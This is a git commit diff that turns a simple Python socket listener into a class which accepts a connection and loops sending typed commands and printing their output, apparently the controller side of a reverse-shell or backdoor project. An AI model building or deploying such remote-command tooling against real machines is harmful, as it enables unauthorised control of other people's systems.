9cbc6ac8f29e9c245264c9c4942dcc3002cb8c00
Yiğit Emre Yıldırım <yldrmyigit00@gmail.com>
2026-06-30 01:51:49 -0700

    Update nyxa_socket_listener.py

--- nyxa_socket_listener.py
+++ nyxa_socket_listener.py
@@ -1,9 +1,18 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-listener.bind(("192.168.1.59",8080))
-listener.listen(0)
-print("listening on")
-listener.accept()
-print("Connected")
+class SocketListener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("listening on")
+        (self.connection, address) = listener.accept()
+        print("Connected from " + str(address))
+
+    def listening(self):
+        while True:
+            command_input = raw_input("enter command: ")
+            self.connection.send(command_input)
+            command_output = self.connection.recv(1024)
+            print(command_output)
